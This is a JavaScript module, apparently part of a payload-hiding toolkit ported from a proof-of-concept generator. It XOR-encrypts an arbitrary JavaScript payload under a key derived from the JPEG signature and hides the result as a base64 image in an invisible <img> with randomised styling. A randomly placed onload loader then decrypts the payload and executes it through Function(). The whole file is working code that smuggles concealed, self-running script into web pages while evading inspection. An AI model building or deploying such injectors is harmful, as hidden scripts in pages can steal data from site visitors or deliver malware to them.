// SPDX-License-Identifier: AGPL-3.0-or-later
/*
 * hidden-img-xor.js — Port of poc_gen.py. XOR-encrypts the JS payload with a
 * key derived from a JPEG header (so the key doubles as camouflage), hides it
 * in a randomly-styled invisible <img>, and triggers it from a randomly
 * placed onload attribute on a random eligible tag.
 *
 * Minification delegated to Terser (jsDelivr ESM build) for guaranteed-
 * correct handling of template literals, regex literals, and ASI; falls back
 * to a safe conservative stripper when the CDN is unreachable. HTML parsing
 * uses native DOMParser — no library improves on it in a browser.
 */

import { randInt, randomHexId, bytesToBase64, loadEsm, log } from '../lib/engine-utils.js';

const TERSER_ESM = 'https://cdn.jsdelivr.net/npm/terser@5.31.6/+esm';

const ONLOAD_TAGS = new Set(['body', 'img', 'iframe', 'script', 'link', 'object']);
const FORBIDDEN_PARENTS = new Set(['head', 'title', 'script', 'img', 'link']);
const VOID_ELEMENTS = new Set([
  'area', 'base', 'br', 'col', 'embed', 'hr',
  'img', 'input', 'link', 'meta', 'param', 'source', 'track', 'wbr',
]);
// JPEG SOI/APP0/JFIF magic — XOR key material
const JPEG_SIG = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46,
  0x00, 0x01, 0x02, 0x01, 0x00, 0x48, 0x00, 0x48, 0x00];

// --------------------------------------------------------------- minifiers
/**
 * Preferred: Terser. compress/mangle disabled — strip whitespace only, since
 * the XOR layer provides the actual obfuscation. Terser's real parser is
 * what guarantees correctness on template literals and regexes.
 */
async function minifyWithTerser(src) {
  const { minify } = await loadEsm(TERSER_ESM);
  const out = await minify(src, { compress: false, mangle: false });
  if (!out.code) throw new Error('terser produced empty output');
  return out.code.trim();
}

/**
 * Fallback: conservative stripper. Comments + newlines outside string
 * literals; newlines become spaces (safe for ASI). Correct, just verbose.
 */
function conservativeStrip(src) {
  let out = '', i = 0, mode = null;
  while (i < src.length) {
    const c = src[i];
    if (mode) {
      out += c;
      if (c === '\\') { out += src[i + 1] ?? ''; i += 2; continue; }
      if (c === mode) mode = null;
      i++; continue;
    }
    if (c === '"' || c === "'" || c === '`') { mode = c; out += c; i++; continue; }
    if (c === '/' && src[i + 1] === '/') { while (i < src.length && src[i] !== '\n') i++; continue; }
    if (c === '/' && src[i + 1] === '*') { i += 2; while (i < src.length && !(src[i] === '*' && src[i + 1] === '/')) i++; i += 2; continue; }
    out += c === '\n' || c === '\r' ? ' ' : c;
    i++;
  }
  return out.trim();
}

async function minifyJs(src) {
  try {
    return await minifyWithTerser(src);
  } catch {
    return conservativeStrip(src); // offline / CDN failure: still correct, just less compact
  }
}

// ---------------------------------------------------------------- helpers
function randomHiddenStyle() {
  const styles = [
    'display:none', 'display : none', 'display:none!important',
    'clip-path:inset(100%)', 'clip-path: inset(100%)',
    'clip-path:inset(100% 100% 100% 100%)', 'clip-path:inset(100% 0 0 0)',
    'clip-path: inset(100%) !important',
    'width:0;height:0;overflow:hidden', 'width:1px;height:1px;overflow:hidden',
    'max-width:0;max-height:0;overflow:hidden',
    'position:absolute;left:-9999px', 'position:fixed;top:-100vh',
    'position:absolute;clip:rect(0,0,0,0)', 'opacity:0',
    'opacity:0;pointer-events:none', 'visibility:hidden',
    'visibility:hidden;position:absolute',
    'display:none;clip-path:inset(100%)',
    'position:absolute;width:0;height:0;opacity:0',
  ];
  return styles[randInt(styles.length)];
}

// Key derives from the first min(19, len) UTF-8 BYTES of the payload XOR'd
// against the fixed JPEG signature — a deterministic, byte-accurate key length
// (fixes the original's 20-characters-vs-bytes variance).
function encryptJsContent(content, encoder) {
  const u = encoder.encode(content);
  const key = new Uint8Array(Math.min(19, u.length));
  for (let i = 0; i < key.length; i++) key[i] = u[i] ^ JPEG_SIG[i];
  const encrypted = new Uint8Array(u.length);
  for (let i = 0; i < u.length; i++) encrypted[i] = u[i] ^ key[i % key.length];
  return { encrypted, key };
}

// TextDecoder (not String.fromCharCode) fixes UTF-8 mojibake; the in-place
// XOR loop avoids the spread-argument stack overflow on big payloads.
function generateLoader(key, imgId) {
  const keyArr = [...key].map((b) => '0x' + b.toString(16).padStart(2, '0')).join(',');
  const delay = 16 + randInt(113);
  return `setTimeout(()=>{let a=Uint8Array.from(atob(${imgId}.src.split(',')[1]),c=>c.charCodeAt(0)),k=[${keyArr}];` +
    `for(let i=0;i<a.length;i++)a[i]^=k[i%k.length];` +
    `Function(new TextDecoder().decode(a))()},${delay})`;
}

// FIXED: original iterated the parent's children, not the ancestor chain.
function isValidImgContainer(el) {
  const name = el.tagName.toLowerCase();
  if (VOID_ELEMENTS.has(name) || FORBIDDEN_PARENTS.has(name)) return false;
  for (let p = el.parentElement; p && p.nodeType === 1; p = p.parentElement)
    if (FORBIDDEN_PARENTS.has(p.tagName.toLowerCase())) return false;
  return true;
}

export const engine = {
  id: 'hidden-img-xor',
  label: 'Hidden Image XOR',
  description:
    'XOR-encrypts the JS payload with a JPEG-header-derived key, hides it in an ' +
    'invisible random-style <img>, and executes it via a randomly placed onload ' +
    'attribute. Minified by Terser (CDN) with an offline fallback.',

  async execute({ html, js }) {
    if (!js || !js.trim()) throw new Error('JavaScript payload is empty.');

    const encoder = new TextEncoder();
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const jsContent = await minifyJs(js);

    const { encrypted, key } = encryptJsContent(jsContent, encoder);
    const b64 = bytesToBase64(encrypted);

    const imgId = 'img_' + randomHexId(4);
    const img = doc.createElement('img');
    img.id = imgId;
    img.src = `data:image/jpeg;base64,${b64}`;
    img.setAttribute('style', randomHiddenStyle());
    const loader = generateLoader(key, imgId);

    const candidates = [...doc.querySelectorAll('*')].filter(
      (el) => ONLOAD_TAGS.has(el.tagName.toLowerCase()) && el.getAttribute('onload') === null,
    );
    if (!candidates.length) throw new Error('No applicable tags without an existing onload found.');
    const tag = candidates[randInt(candidates.length)];

    // Insert onload at a random attribute boundary (DOM attr order = insertion order)
    const attrs = [...tag.attributes].map((a) => [a.name, a.value]);
    attrs.splice(randInt(attrs.length + 1), 0, ['onload', loader]);
    while (tag.attributes.length) tag.removeAttribute(tag.attributes[0].name);
    for (const [n, v] of attrs) tag.setAttribute(n, v);

    const targets = [...doc.body.querySelectorAll('*')].filter(isValidImgContainer)
      .concat(isValidImgContainer(doc.body) ? [doc.body] : []);
    if (!targets.length) throw new Error('No valid container found for image insertion.');
    const target = targets[randInt(targets.length)];
    const method = ['append', 'prepend', 'before', 'after'][randInt(4)];
    if (method === 'append') target.appendChild(img);
    else if (method === 'prepend') target.prepend(img);
    else if (method === 'before') target.before(img);
    else target.after(img);

    const doctype = /<!doctype[^>]*>/i.exec(html);
    let outHtml = doc.documentElement.outerHTML;
    if (doctype) outHtml = doctype[0] + '\n' + outHtml;

    return {
      html: outHtml,
      stdout: log('HIDDEN-IMG-XOR',
        `Inserted onload into <${tag.tagName.toLowerCase()}>`,
        `Payload inserted via ${method} into <${target.tagName.toLowerCase()}>`,
        `Image id "${imgId}", ${encrypted.length} encrypted bytes.`,
        `Minified payload: ${js.length} -> ${jsContent.length} chars`),
      stderr: '',
    };
  },
};
export default engine;
